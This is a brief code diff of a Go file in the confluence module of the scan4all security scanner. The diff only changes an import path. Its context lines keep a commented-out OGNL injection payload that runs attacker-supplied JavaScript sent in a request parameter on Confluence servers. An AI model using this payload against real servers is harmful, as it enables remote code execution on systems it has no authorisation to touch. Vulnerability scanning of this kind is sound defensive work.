@@ -1,7 +1,7 @@
 package confluence
 
 import (
-	"github.com/hktalent/scan4all/lib/util"
+	"github.com/GhostTroops/scan4all/lib/util"
 )
 
 //var beichen26134 = "${#a=new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(@com.opensymphony.webwork.ServletActionContext@getRequest().getParameter(\"search\")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(\"X-Status\",\"ok\"))}"
